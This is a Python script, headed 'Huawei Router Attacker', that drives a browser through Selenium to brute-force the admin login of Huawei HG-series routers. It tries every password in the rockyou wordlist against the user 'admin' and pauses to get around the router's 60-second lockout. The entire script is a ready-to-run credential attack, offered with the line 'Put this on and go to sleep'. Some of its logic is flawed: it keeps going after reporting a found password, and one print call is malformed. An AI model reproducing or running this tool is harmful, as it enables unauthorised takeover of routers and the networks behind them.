#!/usr/bin/python3
# For Huwaei Router HG* Series : Put this on and go to sleep.. :)

from selenium import webdriver
import time
from pyfiglet import Figlet

custom_fig = Figlet(font='graffiti')
print(custom_fig.renderText('Huawei Router Attacker'))
print(custom_fig.renderText('        - VAD3R'))

driver = webdriver.Firefox(executable_path=r'path-to-executable') # path to selenium geckodriver
delay = 8 # give delay as you require
driver.get('router_ip')
alert_obj = driver.switch_to.alert
alert_obj.accept()
time.sleep(delay)
counter = 0

with open('/usr/share/wordlists/rockyou.txt','r') as f:
    for line in f:
        passw = line.strip('\n')
        user = 'admin'   # your router admin username
        
        username = driver.find_element_by_id('txt_Username')
        username.send_keys(user) 

        password = driver.find_element_by_id('txt_Password')    
        password.send_keys(passw)
        print("Trying %s: %s",(user,passw))
        
        submit   = driver.find_element_by_id('button')                
        submit.click()
        
        time.sleep(delay)
        if counter >= 2:
            time.sleep(62) # 60 seconds lock
            counter = 0
        else:
            if ("Please try again." in driver.page_source):
                counter = counter + 1
            else:
                counter = 2
                print("password found:"+str(passw))


driver.close()
f.close()
